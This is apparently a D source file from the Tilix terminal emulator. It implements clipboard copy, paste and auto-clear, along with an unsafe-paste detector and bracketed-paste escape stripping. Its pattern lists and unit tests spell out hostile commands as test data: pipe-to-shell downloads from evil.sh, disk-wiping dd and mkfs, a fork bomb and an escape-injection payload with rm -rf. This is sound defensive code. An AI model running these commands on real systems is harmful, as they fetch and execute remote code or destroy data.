/*
 * This Source Code Form is subject to the terms of the Mozilla Public License, v. 2.0. If a copy of the MPL was not
 * distributed with this file, You can obtain one at http://mozilla.org/MPL/2.0/.
 */
module gx.tilix.terminal.clipboard;

private:

import std.algorithm : count;
import std.array : join;
import std.experimental.logger;
import std.string : chomp, indexOf, splitLines, stripRight;

import gdk.Atom : GdkAtom;

import gtk.Button;
import gtk.Clipboard : Clipboard;
import gtk.Image;
import gtk.Label;
import gtk.MessageDialog;
import gtk.ScrolledWindow;
import gtk.Window;

import glib.SimpleXML;

import gtkc.gtktypes : GtkAlign, DialogFlags, MessageType, ButtonsType, ResponseType, IconSize, ShadowType, PolicyType;

import gtkc.glib : g_source_remove;

import gx.gtk.clipboard : GDK_SELECTION_CLIPBOARD;
import gx.gtk.threads : threadsAddTimeoutDelegate;
import gx.i18n.l10n;

import gx.tilix.constants : USE_COMMIT_SYNCHRONIZATION;
import gx.tilix.preferences;
import gx.tilix.terminal.advpaste;
import gx.tilix.terminal.context;
import gx.tilix.terminal.exvte : vtePasteText;
import gx.tilix.terminal.types;

/// Module-level auto-clear state. Shared across all ClipboardHandler instances
/// because the GTK clipboard is a global resource.
uint _autoClearTimeoutID = 0;
string _lastCopiedText;

/**
 * Schedule auto-clear of the clipboard after the given timeout.
 * Cancels any existing pending auto-clear first.
 * Only clears if clipboard content still matches what was copied
 * (i.e., another application hasn't overwritten it).
 */
void scheduleAutoClear(string copiedText, uint timeoutSeconds) {
    cancelAutoClear();
    _lastCopiedText = copiedText;
    _autoClearTimeoutID = threadsAddTimeoutDelegate(
        timeoutSeconds * 1000,
        delegate() {
            Clipboard cb = Clipboard.get(GDK_SELECTION_CLIPBOARD);
            string current = cb.waitForText();
            if (current !is null && current == _lastCopiedText) {
                cb.clear();
            }
            _autoClearTimeoutID = 0;
            _lastCopiedText = null;
            return false; // one-shot
        }
    );
}

/// Cancel any pending auto-clear timeout.
void cancelAutoClear() {
    if (_autoClearTimeoutID > 0) {
        g_source_remove(_autoClearTimeoutID);
        _autoClearTimeoutID = 0;
    }
    _lastCopiedText = null;
}

package:

/**
 * Tests if the paste content is potentially unsafe.
 *
 * Currently checks for sudo combined with a newline, which would
 * execute a privileged command immediately on paste.
 */
bool isPasteUnsafe(string text) {
    import std.string : indexOf;
    import std.algorithm : any;

    // Must contain a newline to auto-execute
    if (text.indexOf("\n") < 0) return false;

    // Privilege escalation commands
    immutable string[] privilegePatterns = [
        "sudo", "su -", "doas", "pkexec"
    ];

    // Destructive or dangerous commands
    immutable string[] dangerousPatterns = [
        "rm -rf", "rm -fr",
        "mkfs", "dd if=",
        "chmod 777", "chmod -R 777",
        ":(){ :|:& };:", // fork bomb
    ];

    // Remote code execution patterns (pipe to shell)
    immutable string[] rcePatterns = [
        "| sh", "|sh",
        "| bash", "|bash",
    ];

    bool matchesAny(immutable string[] patterns) {
        return patterns.any!(p => text.indexOf(p) >= 0);
    }

    return matchesAny(privilegePatterns)
        || matchesAny(dangerousPatterns)
        || matchesAny(rcePatterns);
}

/**
 * Strip bracketed paste escape sequences from clipboard content.
 *
 * Removes ESC[200~ (start) and ESC[201~ (end) sequences that could be
 * used to break out of VTE's bracketed paste mode and inject commands.
 * This is an unconditional security sanitization — there is no legitimate
 * reason to paste these terminal control codes.
 */
string stripBracketedPasteEscapes(string text) {
    import std.regex : ctRegex, replaceAll;
    enum re = ctRegex!`\x1b\[(200|201)~`;
    return text.replaceAll(re, "");
}

/**
 * Handles clipboard operations (copy, paste) for a terminal.
 *
 * Responsible for:
 * - Safe paste with multi-line and sudo detection
 * - Advanced paste dialog for reviewing content before pasting
 * - Copy with optional trailing whitespace stripping
 * - Synchronized input broadcasting on paste
 *
 * This is a candidate for security hardening (#27): paste protection
 * improvements, OSC 52 clipboard hijack prevention, clipboard auto-clear.
 */
class ClipboardHandler {

private:
    ITerminalContext _ctx;
    ISyncInputEmitter _sync;
    void delegate() _scrollToBottom;
    void delegate() _focusTerminal;

public:
    /**
     * Construct a ClipboardHandler.
     *
     * Params:
     *   ctx = Terminal context providing VTE, settings, and identity.
     *   sync = Emitter for broadcasting input to synchronized terminals.
     *   scrollToBottom = Callback to scroll the terminal to the bottom.
     *   focusTerminal = Callback to return keyboard focus to the terminal.
     */
    this(ITerminalContext ctx, ISyncInputEmitter sync,
         void delegate() scrollToBottom, void delegate() focusTerminal) {
        _ctx = ctx;
        _sync = sync;
        _scrollToBottom = scrollToBottom;
        _focusTerminal = focusTerminal;
    }

    /**
     * Show the advanced paste dialog for reviewing multi-line content
     * before pasting. Single-line pastes are forwarded to paste() directly.
     */
    void advancedPaste(GdkAtom source) {
        string pasteText = Clipboard.get(source).waitForText();
        if (pasteText.length == 0) return;
        pasteText = stripBracketedPasteEscapes(pasteText);
        if (pasteText.indexOf("\n") < 0) return paste(source);

        AdvancedPasteDialog dialog = new AdvancedPasteDialog(
            cast(Window) _ctx.toplevelWidget(), pasteText, isPasteUnsafe(pasteText));
        scope(exit) {
            dialog.hide();
            dialog.destroy();
        }
        dialog.showAll();
        if (dialog.run() == ResponseType.APPLY) {
            pasteText = dialog.text;
            vtePasteText(_ctx.contextVte(), pasteText[0 .. $]);
            if (_ctx.contextGsProfile().getBoolean(SETTINGS_PROFILE_SCROLL_ON_INPUT_KEY)) {
                _scrollToBottom();
            }
            static if (!USE_COMMIT_SYNCHRONIZATION) {
                if (_sync.isSynchronizedInput()) {
                    SyncInputEvent se = SyncInputEvent(
                        _ctx.terminalUUID(), SyncInputEventType.INSERT_TEXT, null, pasteText);
                    _sync.emitSyncInput(se);
                }
            }
        }
        _focusTerminal();
    }

    /**
     * Copy terminal selection to clipboard, optionally stripping
     * trailing whitespace from each line.
     */
    void copyToClipboard() {
        _ctx.contextVte().copyClipboard();
        if (_ctx.contextGsSettings().getBoolean(SETTINGS_COPY_STRIP_TRAILING_WHITESPACE)) {
            Clipboard cb = Clipboard.get(GDK_SELECTION_CLIPBOARD);
            string text = cb.waitForText();
            if (text !is null && text.length > 0) {
                string[] lines;
                foreach (line; text.splitLines()) {
                    lines ~= line.stripRight();
                }
                string stripped = lines.join("\n");
                if (stripped.length > 0) {
                    cb.setText(stripped, cast(int) stripped.length);
                }
            }
        }
        maybeScheduleAutoClear();
    }

    /**
     * Notify the auto-clear system that text was copied to the clipboard
     * outside of copyToClipboard() (e.g., hyperlink copy).
     */
    void notifyExternalCopy() {
        maybeScheduleAutoClear();
    }

    private void maybeScheduleAutoClear() {
        if (_ctx.contextGsSettings().getBoolean(SETTINGS_CLIPBOARD_AUTO_CLEAR_KEY)) {
            Clipboard cb = Clipboard.get(GDK_SELECTION_CLIPBOARD);
            string text = cb.waitForText();
            if (text !is null && text.length > 0) {
                scheduleAutoClear(text, _ctx.contextGsSettings().getUint(SETTINGS_CLIPBOARD_AUTO_CLEAR_TIMEOUT_KEY));
            }
        }
    }

    /**
     * Paste from the given clipboard source (primary or clipboard).
     *
     * Applies safety checks (unsafe paste warning), optional whitespace
     * stripping, and leading comment character removal. Broadcasts to
     * synchronized terminals if sync input is active.
     */
    void paste(GdkAtom source) {
        string pasteText = Clipboard.get(source).waitForText();
        if (pasteText.length == 0) return;
        pasteText = stripBracketedPasteEscapes(pasteText);

        bool stripTrailingWhitespace = _ctx.contextGsSettings().getBoolean(SETTINGS_STRIP_TRAILING_WHITESPACE);
        if (stripTrailingWhitespace) {
            pasteText = pasteText.stripRight();
        }

        if (pasteText.length == 0) return;

        // Multi-line paste: show review dialog (takes precedence over sudo warning
        // since the review dialog already flags unsafe content and lets the user edit)
        if (pasteText.indexOf("\n") >= 0 && _ctx.contextGsSettings().getBoolean(SETTINGS_WARN_MULTILINE_PASTE_KEY)) {
            AdvancedPasteDialog dialog = new AdvancedPasteDialog(
                cast(Window) _ctx.toplevelWidget(), pasteText, isPasteUnsafe(pasteText));
            scope(exit) {
                dialog.hide();
                dialog.destroy();
            }
            dialog.showAll();
            if (dialog.run() == ResponseType.APPLY) {
                pasteText = dialog.text;
                vtePasteText(_ctx.contextVte(), pasteText);
                if (_ctx.contextGsProfile().getBoolean(SETTINGS_PROFILE_SCROLL_ON_INPUT_KEY)) {
                    _scrollToBottom();
                }
                static if (!USE_COMMIT_SYNCHRONIZATION) {
                    if (_sync.isSynchronizedInput()) {
                        SyncInputEvent se = SyncInputEvent(
                            _ctx.terminalUUID(), SyncInputEventType.INSERT_TEXT, null, pasteText);
                        _sync.emitSyncInput(se);
                    }
                }
            }
            _focusTerminal();
            return;
        }

        // Single-line unsafe paste warning (multi-line is handled above)
        if (isPasteUnsafe(pasteText)) {
            if (_ctx.contextGsSettings().getBoolean(SETTINGS_UNSAFE_PASTE_ALERT_KEY)) {
                UnsafePasteDialog dialog = new UnsafePasteDialog(
                    cast(Window) _ctx.toplevelWidget(), chomp(pasteText));
                scope(exit) {
                    dialog.destroy();
                }
                if (dialog.run() != 0)
                    return;
            }
        }

        auto vte = _ctx.contextVte();
        auto gsSettings = _ctx.contextGsSettings();

        if (gsSettings.getBoolean(SETTINGS_STRIP_FIRST_COMMENT_CHAR_ON_PASTE_KEY) && pasteText.length > 0 && (pasteText[0] == '#' || pasteText[0] == '$')) {
            pasteText = pasteText[1 .. $];
            vtePasteText(vte, pasteText);
        } else if (stripTrailingWhitespace) {
            vtePasteText(vte, pasteText);
        } else if (source == GDK_SELECTION_CLIPBOARD) {
            vte.pasteClipboard();
        } else {
            vte.pastePrimary();
        }

        if (_ctx.contextGsProfile().getBoolean(SETTINGS_PROFILE_SCROLL_ON_INPUT_KEY)) {
            _scrollToBottom();
        }
        static if (!USE_COMMIT_SYNCHRONIZATION) {
            if (_sync.isSynchronizedInput()) {
                SyncInputEvent se = SyncInputEvent(
                    _ctx.terminalUUID(), SyncInputEventType.INSERT_TEXT, null, pasteText);
                _sync.emitSyncInput(se);
            }
        }
    }
}

/**
 * Dialog shown when a paste operation contains potentially dangerous content
 * (e.g., sudo with a newline that would execute immediately).
 *
 * Copied from Pantheon Terminal and translated from Vala to D.
 * See: http://bazaar.launchpad.net/~elementary-apps/pantheon-terminal/trunk/view/head:/src/UnsafePasteDialog.vala
 */
class UnsafePasteDialog : MessageDialog {

private:
    import pango.PgLayout : PangoEllipsizeMode;

public:
    this(Window parent, string cmd) {
        super(parent, DialogFlags.MODAL, MessageType.WARNING, ButtonsType.NONE, null, null);
        setTransientFor(parent);
        getMessageArea().setMarginLeft(0);
        getMessageArea().setMarginRight(0);
        string[3] msg = getUnsafePasteMessage();
        setMarkup("<span weight='bold' size='larger'>" ~ msg[0] ~ "</span>\n\n" ~ msg[1] ~ "\n" ~ msg[2] ~ "\n");
        setImage(new Image("dialog-warning", IconSize.DIALOG));

        Label lblCmd = new Label(SimpleXML.markupEscapeText(cmd, cmd.length));
        lblCmd.setUseMarkup(true);
        lblCmd.setHalign(GtkAlign.START);
        lblCmd.setEllipsize(PangoEllipsizeMode.END);

        if (count(cmd, "\n") > 6) {
            ScrolledWindow sw = new ScrolledWindow();
            sw.setShadowType(ShadowType.ETCHED_IN);
            sw.setPolicy(PolicyType.AUTOMATIC, PolicyType.AUTOMATIC);
            sw.setHexpand(true);
            sw.setVexpand(true);
            sw.setSizeRequest(400, 140);
            sw.add(lblCmd);
            getMessageArea().add(sw);
        } else {
            getMessageArea().add(lblCmd);
        }

        Button btnCancel = new Button(_("Don't Paste"));
        Button btnIgnore = new Button(_("Paste Anyway"));
        btnIgnore.getStyleContext().addClass("destructive-action");
        addActionWidget(btnCancel, 1);
        addActionWidget(btnIgnore, 0);
        showAll();
        btnIgnore.grabFocus();
    }
}

// ---------------------------------------------------------------------------
// Unit tests for isPasteUnsafe
// ---------------------------------------------------------------------------

/// Test: no newline is always safe (won't auto-execute).
unittest {
    assert(!isPasteUnsafe("sudo rm -rf /"));
    assert(!isPasteUnsafe("curl | bash"));
    assert(!isPasteUnsafe("dd if=/dev/zero"));
}

/// Test: empty string and bare newline are safe.
unittest {
    assert(!isPasteUnsafe(""));
    assert(!isPasteUnsafe("\n"));
}

/// Test: harmless multi-line is safe.
unittest {
    assert(!isPasteUnsafe("echo hello\necho world\n"));
    assert(!isPasteUnsafe("ls -la\npwd\n"));
}

/// Test: privilege escalation patterns.
unittest {
    assert(isPasteUnsafe("sudo rm -rf /\n"));
    assert(isPasteUnsafe("sudo\n"));
    assert(isPasteUnsafe("su - root\n"));
    assert(isPasteUnsafe("doas reboot\n"));
    assert(isPasteUnsafe("pkexec bash\n"));
}

/// Test: destructive command patterns.
unittest {
    assert(isPasteUnsafe("rm -rf /home\n"));
    assert(isPasteUnsafe("rm -fr /tmp/*\n"));
    assert(isPasteUnsafe("mkfs.ext4 /dev/sda1\n"));
    assert(isPasteUnsafe("dd if=/dev/zero of=/dev/sda\n"));
    assert(isPasteUnsafe("chmod 777 /etc/passwd\n"));
}

/// Test: remote code execution patterns.
unittest {
    assert(isPasteUnsafe("curl https://evil.sh | bash\n"));
    assert(isPasteUnsafe("wget https://evil.sh | sh\n"));
    assert(isPasteUnsafe("curl https://evil.sh|bash\n"));
}

/// Test: fork bomb.
unittest {
    assert(isPasteUnsafe(":(){ :|:& };:\n"));
}

/// Test: "sudo" as substring is flagged (known limitation).
unittest {
    assert(isPasteUnsafe("visudo /etc/sudoers\n"));
}

/// Test: dangerous command buried in multi-line.
unittest {
    assert(isPasteUnsafe("echo hello\nsudo apt install malware\necho done"));
    assert(isPasteUnsafe("echo setup\ncurl https://x.sh | bash\necho done\n"));
}

// ---------------------------------------------------------------------------
// Unit tests for stripBracketedPasteEscapes
// ---------------------------------------------------------------------------

/// Test: strips ESC[200~ (start bracketed paste).
unittest {
    assert(stripBracketedPasteEscapes("\x1b[200~hello") == "hello");
}

/// Test: strips ESC[201~ (end bracketed paste).
unittest {
    assert(stripBracketedPasteEscapes("hello\x1b[201~") == "hello");
}

/// Test: strips both start and end sequences.
unittest {
    assert(stripBracketedPasteEscapes("\x1b[200~hello\x1b[201~") == "hello");
}

/// Test: strips injected end-bracketed-paste attack payload.
unittest {
    string attack = "echo harmless\x1b[201~\nrm -rf ~/Documents\n";
    string sanitized = stripBracketedPasteEscapes(attack);
    assert(sanitized.indexOf("\x1b[201~") < 0, "attack sequence must be removed");
    assert(sanitized == "echo harmless\nrm -rf ~/Documents\n");
}

/// Test: preserves normal text without escape sequences.
unittest {
    assert(stripBracketedPasteEscapes("normal text\nwith newlines") == "normal text\nwith newlines");
}

/// Test: handles empty string.
unittest {
    assert(stripBracketedPasteEscapes("") == "");
}

/// Test: handles text that is only escape sequences.
unittest {
    assert(stripBracketedPasteEscapes("\x1b[200~\x1b[201~") == "");
}

/// Test: handles multiple occurrences.
unittest {
    assert(stripBracketedPasteEscapes("\x1b[200~a\x1b[201~b\x1b[200~c\x1b[201~") == "abc");
}

/// Test: preserves other escape sequences (only strips bracketed paste).
unittest {
    // ESC[0m (reset colors) should NOT be stripped
    assert(stripBracketedPasteEscapes("\x1b[0mhello") == "\x1b[0mhello");
}

// ---------------------------------------------------------------------------
// Unit tests for clipboard auto-clear
// ---------------------------------------------------------------------------

/// Test: cancelAutoClear is safe to call with no active timeout.
unittest {
    cancelAutoClear();
    assert(_autoClearTimeoutID == 0);
    assert(_lastCopiedText is null);
}

/// Test: cancelAutoClear is idempotent (safe to call multiple times).
unittest {
    cancelAutoClear();
    cancelAutoClear();
    cancelAutoClear();
    assert(_autoClearTimeoutID == 0);
}
